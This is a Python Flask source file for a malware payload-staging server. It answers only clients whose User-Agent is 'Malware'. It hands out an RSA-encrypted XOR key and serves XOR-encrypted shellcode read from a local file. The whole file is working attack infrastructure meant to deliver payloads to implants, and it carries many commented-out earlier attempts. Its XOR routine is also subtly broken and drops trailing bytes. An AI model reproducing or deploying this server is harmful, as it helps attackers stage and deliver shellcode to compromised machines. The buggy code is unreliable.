from flask import Flask, request, send_file, abort, Response
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from wincrypto import CryptImportKey, CryptEncrypt, CryptGetKeyParam, CryptCreateHash, CryptHashData, CryptDeriveKey, CryptExportKey
from wincrypto.constants import CALG_SHA1, CALG_AES_256, bType_SIMPLEBLOB, bType_PUBLICKEYBLOB

app = Flask(__name__)

#derive key from password
sha1_hasher = CryptCreateHash(CALG_SHA1)
CryptHashData(sha1_hasher, b'Password')
aes_key = CryptDeriveKey(sha1_hasher, CALG_AES_256)

secret = "736563726574"

def xor(data, key): 
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key))))

@app.before_request
def check_user_agent():
    user_agent = request.headers.get('User-Agent')
    if user_agent != 'Malware':
        abort(403)

@app.route('/payload/<int:id>', methods=['POST', 'GET'])
def payload(id):
    if id == 2 and request.method == 'POST':
        print("request received from : ", request.remote_addr)
        print("public key received : ", request.data)
        public_key = request.data
        rsa_pub_key = CryptImportKey(public_key)
        bytes_secret = bytes.fromhex(secret)
        encrypted_xor_key = CryptEncrypt(rsa_pub_key, bytes_secret)

        # encrypted_aes_key = CryptExportKey(aes_key, rsa_pub_key, bType_SIMPLEBLOB)
        # message = b"Hello World"
        # with open('shellcode.hex', 'rb') as f:
        #     message = f.read()
        # encrypted_message = b''
        # for i in range(0, len(message), 64):
        #     chunk = message[i:i + 64]
        #     encrypted_chunk = CryptEncrypt(rsa_pub_key, chunk)
        #     encrypted_message += encrypted_chunk
            # print(i)
        # encrypted = CryptEncrypt(rsa_pub_key, message)
        # print("Encrypted for ", request.remote_addr)
        print("len of enc :", len(encrypted_xor_key))
        print("encrypted_xor_key : ", encrypted_xor_key)
        return encrypted_xor_key
        # print("message : ", message, " ", len(message))
        # encrypted_message = b''
        
        # print("encrypted_message : ", encrypted_message, " ", len(encrypted_message))
        # return Response(encrypted_message, content_type='application/octet-stream')
        # # return b''.join(encrypted_message)
        # # Send encrypted message as response to client
        # join_encrypted = b''.join(encrypted_message)
        # print("join_encrypted : ", join_encrypted, " ", len(join_encrypted))

        # # Write encrypted message to file
        # with open('encrypted_message.txt', 'wb') as f:
        #     f.write(join_encrypted)

        # return send_file('encrypted_message.txt', mimetype='text/plain')
    elif id == 2 and request.method == 'GET':
        print("request received from : ", request.remote_addr, " on the GET method")
        # encrypt message with aes key generated in main
        # message = b'Hello World dddddddddddddddddd Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum dsd'
        
        with open('shellcode.hex', 'rb') as f:
            message = f.read()
        
        bytes_secret = bytes.fromhex(secret)
        encrypted_message = xor(message, bytes_secret)

        print("encrypted : ", encrypted_message)
        print("len encrypted : ", len(encrypted_message))
        print("decrypted : ", xor(encrypted_message, bytes_secret))

        return encrypted_message
    else:
        return 'No payload for id {}'.format(id)

if __name__ == '__main__':
    app.debug = True
    app.run(host='0.0.0.0', port=5001)

